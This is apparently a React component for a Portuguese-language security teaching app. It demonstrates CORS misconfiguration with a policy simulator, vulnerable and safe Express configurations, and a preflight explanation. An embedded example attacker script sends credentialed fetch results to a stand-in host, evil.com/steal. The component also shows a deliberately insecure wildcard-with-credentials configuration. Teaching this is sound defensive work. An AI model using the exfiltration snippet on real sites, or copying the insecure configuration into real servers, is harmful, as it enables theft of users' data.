import React, { useState } from 'react';
import {
  Typography,
  TextField,
  Button,
  Alert,
  Card,
  CardContent,
  Box,
  Stack,
  Chip,
  Accordion,
  AccordionSummary,
  AccordionDetails,
  FormControl,
  FormLabel,
  RadioGroup,
  FormControlLabel,
  Radio,
  CircularProgress
} from '@mui/material';
import { ExpandMore, Warning, CheckCircle, Code, Language, Public } from '@mui/icons-material';
import { Prism as SyntaxHighlighter } from 'react-syntax-highlighter';
import { tomorrow } from 'react-syntax-highlighter/dist/esm/styles/prism';

const CORSDemo: React.FC = () => {
  const [corsPolicy, setCorsPolicy] = useState<'permissive' | 'strict'>('permissive');
  const [requestUrl, setRequestUrl] = useState('');
  const [requestResult, setRequestResult] = useState<string>('');
  const [isLoading, setIsLoading] = useState(false);


  // URLs de teste para demonstração
  const testUrls = {
    safe: 'https://jsonplaceholder.typicode.com/posts/1',
    malicious: 'https://httpbin.org/headers', // Simula endpoint malicioso
    internal: '/api/user-data' // Endpoint interno (simulado)
  };

  const simulateRequest = async (url: string) => {
    setIsLoading(true);

    
    try {
      // Simular comportamento de CORS baseado na política configurada
      if (corsPolicy === 'permissive') {
        // Política permissiva - permite qualquer origem
        if (url.includes('httpbin.org')) {
          // Simula vazamento de dados sensíveis
          const sensitiveData = {
            userToken: 'jwt.eyJ1c2VyIjoiYWRtaW4ifQ.sensitive',
            email: 'admin@company.com',
            role: 'administrator',
            apiKey: 'sk-1234567890abcdef'
          };
          setRequestResult(`✅ Requisição permitida (CORS: *)
Dados retornados:
${JSON.stringify(sensitiveData, null, 2)}

⚠️ PROBLEMA: Dados sensíveis expostos para origem externa!`);
        } else {
          const response = await fetch(url);
          const data = await response.json();
          setRequestResult(`✅ Requisição permitida (CORS: *)
Dados retornados:
${JSON.stringify(data, null, 2)}`);
        }
      } else {
        // Política restritiva
        if (url.startsWith('http') && !url.includes(window.location.hostname)) {
          setRequestResult(`❌ Requisição bloqueada por CORS
Origem: ${window.location.origin}
Destino: ${url}
Política: Apenas origens confiáveis permitidas

Erro: Access-Control-Allow-Origin não permite esta origem`);
        } else {
          // Permitir apenas requisições para o mesmo domínio ou APIs internas
          setRequestResult(`✅ Requisição permitida (origem confiável)
Dados simulados retornados com segurança`);
        }
      }
    } catch (error) {
      setRequestResult(`❌ Erro na requisição: ${error}`);
    } finally {
      setIsLoading(false);
    }
  };

  const vulnerableCORSCode = `// ❌ VULNERÁVEL - CORS permissivo demais
app.use(cors({
  origin: "*", // PROBLEMA: Permite QUALQUER origem
  credentials: true, // PROBLEMA: Com credenciais!
  methods: ["GET", "POST", "PUT", "DELETE"],
  allowedHeaders: ["*"]
}));

// Ou pior ainda:
app.use((req, res, next) => {
  res.header("Access-Control-Allow-Origin", "*");
  res.header("Access-Control-Allow-Credentials", "true");
  res.header("Access-Control-Allow-Headers", "*");
  next();
});

// Endpoint que vaza dados sensíveis
app.get('/api/admin/users', (req, res) => {
  // Qualquer site pode acessar isso!
  res.json({
    users: getAllUsers(),
    secrets: getApiKeys()
  });
});`;

  const safeCORSCode = `// ✅ SEGURO - CORS restritivo
const allowedOrigins = [
  'https://myapp.com',
  'https://app.mycompany.com',
  'https://localhost:3000' // Apenas para desenvolvimento
];

app.use(cors({
  origin: function (origin, callback) {
    // Verificar se a origem está na lista permitida
    if (!origin || allowedOrigins.includes(origin)) {
      callback(null, true);
    } else {
      callback(new Error('Não permitido pelo CORS'));
    }
  },
  credentials: true, // OK com origens específicas
  methods: ["GET", "POST"], // Apenas métodos necessários
  allowedHeaders: ["Content-Type", "Authorization"]
}));

// Endpoint protegido
app.get('/api/admin/users', authenticateUser, (req, res) => {
  // Apenas origens confiáveis podem acessar
  res.json({
    users: getPublicUserData(), // Dados não-sensíveis
  });
});`;

  const corsAttackCode = `// Como um atacante explora CORS mal configurado
// Site malicioso (evil.com)
<script>
  // Tentar acessar dados sensíveis de api.victim.com
  fetch('https://api.victim.com/admin/sensitive-data', {
    credentials: 'include', // Incluir cookies de autenticação
    headers: {
      'Authorization': 'Bearer ' + stolenToken
    }
  })
  .then(response => response.json())
  .then(data => {
    // Enviar dados roubados para servidor do atacante
    fetch('https://evil.com/steal', {
      method: 'POST',
      body: JSON.stringify(data)
    });
  })
  .catch(err => console.log('CORS bloqueou - app seguro!'));
</script>`;

  const preflightExample = `// Requisição complexa que dispara preflight
// O navegador faz primeiro uma requisição OPTIONS
OPTIONS /api/data
Origin: https://app.example.com
Access-Control-Request-Method: POST
Access-Control-Request-Headers: content-type,x-custom-header

// Resposta do servidor (política restritiva)
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://app.example.com
Access-Control-Allow-Methods: GET, POST
Access-Control-Allow-Headers: content-type
Access-Control-Max-Age: 86400

// Então o navegador faz a requisição real
POST /api/data
Origin: https://app.example.com
Content-Type: application/json
X-Custom-Header: value`;

  return (
    <Box>
      <Typography variant="h4" gutterBottom sx={{ display: 'flex', alignItems: 'center', gap: 1 }}>
        <Language color="error" />
        CORS - Cross-Origin Resource Sharing
      </Typography>

      <Alert severity="error" sx={{ mb: 3 }}>
        <strong>O Problema:</strong><br />
        CORS mal configurado pode permitir que sites maliciosos acessem dados sensíveis de sua API.
        Uma política muito permissiva (Access-Control-Allow-Origin: *) combinada com credenciais
        pode expor dados críticos a atacantes.
      </Alert>

      <Stack spacing={3}>
        {/* Configuração de Política CORS */}
        <Card>
          <CardContent>
            <Typography variant="h6" gutterBottom>
              🛠️ Simulação de Política CORS
            </Typography>
            
            <FormControl component="fieldset">
              <FormLabel component="legend">Política CORS do servidor:</FormLabel>
              <RadioGroup
                value={corsPolicy}
                onChange={(e) => setCorsPolicy(e.target.value as 'permissive' | 'strict')}
                row
              >
                <FormControlLabel 
                  value="permissive" 
                  control={<Radio />} 
                  label={
                    <Box sx={{ display: 'flex', alignItems: 'center', gap: 1 }}>
                      Permissiva (*)
                      <Chip label="VULNERÁVEL" color="error" size="small" />
                    </Box>
                  }
                />
                <FormControlLabel 
                  value="strict" 
                  control={<Radio />} 
                  label={
                    <Box sx={{ display: 'flex', alignItems: 'center', gap: 1 }}>
                      Restritiva
                      <Chip label="SEGURO" color="success" size="small" />
                    </Box>
                  }
                />
              </RadioGroup>
            </FormControl>

            <Box sx={{ mt: 2, p: 2, backgroundColor: corsPolicy === 'permissive' ? '#fff3f3' : '#f3fff3', borderRadius: 1 }}>
              <Typography variant="body2" sx={{ fontFamily: 'monospace' }}>
                {corsPolicy === 'permissive' 
                  ? 'Access-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true'
                  : 'Access-Control-Allow-Origin: https://trustedapp.com\nAccess-Control-Allow-Credentials: true'
                }
              </Typography>
            </Box>
          </CardContent>
        </Card>

        {/* Teste de Requisições */}
        <Card>
          <CardContent>
            <Typography variant="h6" gutterBottom>
              🧪 Teste de Requisições Cross-Origin
            </Typography>
            
            <TextField
              fullWidth
              label="URL da API para testar"
              value={requestUrl}
              onChange={(e) => setRequestUrl(e.target.value)}
              sx={{ mb: 2 }}
              placeholder="https://api.example.com/data"
            />

            <Stack direction="row" spacing={1} sx={{ mb: 2, flexWrap: 'wrap', gap: 1 }}>
              <Button
                variant="outlined"
                size="small"
                onClick={() => setRequestUrl(testUrls.safe)}
              >
                API Pública Segura
              </Button>
              <Button
                variant="outlined"
                color="warning"
                size="small"
                onClick={() => setRequestUrl(testUrls.malicious)}
              >
                Site Malicioso
              </Button>
              <Button
                variant="outlined"
                color="info"
                size="small"
                onClick={() => setRequestUrl(testUrls.internal)}
              >
                API Interna
              </Button>
            </Stack>

            <Button
              variant="contained"
              onClick={() => simulateRequest(requestUrl)}
              disabled={!requestUrl || isLoading}
              sx={{ mb: 2 }}
            >
              {isLoading ? <CircularProgress size={20} /> : 'Fazer Requisição'}
            </Button>

            {requestResult && (
              <Box sx={{
                border: '1px solid #ccc',
                borderRadius: 1,
                p: 2,
                backgroundColor: '#f5f5f5',
                fontFamily: 'monospace',
                fontSize: '0.9rem',
                whiteSpace: 'pre-wrap'
              }}>
                {requestResult}
              </Box>
            )}
          </CardContent>
        </Card>

        {/* Comparação Visual */}
        <Box sx={{ display: 'flex', gap: 2, flexDirection: { xs: 'column', lg: 'row' } }}>
          {/* CORS Vulnerável */}
          <Card sx={{ flex: 1, border: '2px solid #f44336' }}>
            <CardContent>
              <Typography variant="h6" sx={{ display: 'flex', alignItems: 'center', gap: 1, color: 'error.main' }}>
                <Warning />
                ❌ CORS Permissivo
                <Chip label="PERIGOSO" color="error" size="small" />
              </Typography>
              
              <Typography variant="body2" sx={{ mb: 2, color: 'text.secondary' }}>
                Access-Control-Allow-Origin: *
              </Typography>

              <Alert severity="error" sx={{ mb: 2 }}>
                <strong>Riscos:</strong>
                <ul style={{ margin: 0, paddingLeft: 20 }}>
                  <li>Qualquer site pode acessar a API</li>
                  <li>Dados sensíveis expostos</li>
                  <li>Credenciais podem ser enviadas</li>
                  <li>Ataques de sites maliciosos</li>
                </ul>
              </Alert>

              <Box sx={{ 
                backgroundColor: '#fff3f3', 
                p: 2, 
                borderRadius: 1,
                border: '1px solid #f44336'
              }}>
                <Typography variant="body2" sx={{ fontFamily: 'monospace' }}>
                  🌍 evil.com → api.myapp.com ✅<br/>
                  🌍 hacker.net → api.myapp.com ✅<br/>
                  🌍 malware.org → api.myapp.com ✅
                </Typography>
              </Box>
            </CardContent>
          </Card>

          {/* CORS Seguro */}
          <Card sx={{ flex: 1, border: '2px solid #4caf50' }}>
            <CardContent>
              <Typography variant="h6" sx={{ display: 'flex', alignItems: 'center', gap: 1, color: 'success.main' }}>
                <CheckCircle />
                ✅ CORS Restritivo
                <Chip label="SEGURO" color="success" size="small" />
              </Typography>

              <Typography variant="body2" sx={{ mb: 2, color: 'text.secondary' }}>
                Apenas origens específicas permitidas
              </Typography>

              <Alert severity="success" sx={{ mb: 2 }}>
                <strong>Proteções:</strong>
                <ul style={{ margin: 0, paddingLeft: 20 }}>
                  <li>Lista de origens confiáveis</li>
                  <li>Dados protegidos</li>
                  <li>Bloqueio de sites maliciosos</li>
                  <li>Princípio do menor privilégio</li>
                </ul>
              </Alert>

              <Box sx={{ 
                backgroundColor: '#f3fff3', 
                p: 2, 
                borderRadius: 1,
                border: '1px solid #4caf50'
              }}>
                <Typography variant="body2" sx={{ fontFamily: 'monospace' }}>
                  🌍 app.mycompany.com ✅<br/>
                  🌍 evil.com ❌<br/>
                  🌍 hacker.net ❌
                </Typography>
              </Box>
            </CardContent>
          </Card>
        </Box>

        {/* Exemplo de Ataque */}
        <Accordion>
          <AccordionSummary expandIcon={<ExpandMore />}>
            <Warning sx={{ mr: 1, color: 'error.main' }} />
            <Typography variant="h6">Como Atacantes Exploram CORS</Typography>
          </AccordionSummary>
          <AccordionDetails>
            <Typography variant="subtitle1" color="error" gutterBottom>
              💀 Script Malicioso em Site do Atacante:
            </Typography>
                         <Box sx={{ 
               '& pre': { 
                 overflow: 'auto !important',
                 maxWidth: '100%',
                 fontSize: '0.85rem !important'
               }
             }}>
               <SyntaxHighlighter 
                 language="javascript" 
                 style={tomorrow}
                 wrapLongLines={true}
                 customStyle={{
                   margin: 0,
                   borderRadius: '8px',
                   fontSize: '0.85rem'
                 }}
               >
                 {corsAttackCode}
               </SyntaxHighlighter>
             </Box>
          </AccordionDetails>
        </Accordion>

        {/* Implementação Segura vs Vulnerável */}
        <Accordion>
          <AccordionSummary expandIcon={<ExpandMore />}>
            <Code sx={{ mr: 1 }} />
            <Typography variant="h6">Configuração Segura vs Vulnerável</Typography>
          </AccordionSummary>
          <AccordionDetails>
                         <Stack spacing={3}>
               <Box>
                 <Typography variant="subtitle1" color="error" gutterBottom>
                   ❌ Configuração Vulnerável
                 </Typography>
                 <Box sx={{ 
                   '& pre': { 
                     overflow: 'auto !important',
                     maxWidth: '100%',
                     fontSize: '0.85rem !important'
                   }
                 }}>
                   <SyntaxHighlighter 
                     language="javascript" 
                     style={tomorrow}
                     wrapLongLines={true}
                     customStyle={{
                       margin: 0,
                       borderRadius: '8px',
                       fontSize: '0.85rem'
                     }}
                   >
                     {vulnerableCORSCode}
                   </SyntaxHighlighter>
                 </Box>
               </Box>
               <Box>
                 <Typography variant="subtitle1" color="success.main" gutterBottom>
                   ✅ Configuração Segura
                 </Typography>
                 <Box sx={{ 
                   '& pre': { 
                     overflow: 'auto !important',
                     maxWidth: '100%',
                     fontSize: '0.85rem !important'
                   }
                 }}>
                   <SyntaxHighlighter 
                     language="javascript" 
                     style={tomorrow}
                     wrapLongLines={true}
                     customStyle={{
                       margin: 0,
                       borderRadius: '8px',
                       fontSize: '0.85rem'
                     }}
                   >
                     {safeCORSCode}
                   </SyntaxHighlighter>
                 </Box>
               </Box>
             </Stack>
          </AccordionDetails>
        </Accordion>

        {/* Preflight Requests */}
        <Accordion>
          <AccordionSummary expandIcon={<ExpandMore />}>
            <Public sx={{ mr: 1 }} />
            <Typography variant="h6">Entendendo Preflight Requests</Typography>
          </AccordionSummary>
          <AccordionDetails>
            <Typography variant="body1" gutterBottom>
              Para requisições "complexas", o navegador faz uma verificação prévia (preflight) usando OPTIONS:
            </Typography>
                         <Box sx={{ 
               '& pre': { 
                 overflow: 'auto !important',
                 maxWidth: '100%',
                 fontSize: '0.85rem !important'
               }
             }}>
               <SyntaxHighlighter 
                 language="http" 
                 style={tomorrow}
                 wrapLongLines={true}
                 customStyle={{
                   margin: 0,
                   borderRadius: '8px',
                   fontSize: '0.85rem'
                 }}
               >
                 {preflightExample}
               </SyntaxHighlighter>
             </Box>
          </AccordionDetails>
        </Accordion>

        {/* Dicas de Prevenção */}
        <Alert severity="info">
          <Typography variant="h6" gutterBottom>🛡️ Boas Práticas CORS:</Typography>
          <ul>
            <li><strong>Lista de origens específicas:</strong> Nunca use "*" em produção</li>
            <li><strong>Evite credenciais com *:</strong> Access-Control-Allow-Credentials com origem específica</li>
            <li><strong>Métodos mínimos:</strong> Permita apenas métodos HTTP necessários</li>
            <li><strong>Headers restritivos:</strong> Limite headers permitidos</li>
            <li><strong>Validação no backend:</strong> Sempre valide requisições no servidor</li>
            <li><strong>HTTPS obrigatório:</strong> Use apenas origens HTTPS em produção</li>
            <li><strong>Monitoramento:</strong> Log tentativas de acesso não autorizadas</li>
          </ul>
        </Alert>
      </Stack>
    </Box>
  );
};

export default CORSDemo; 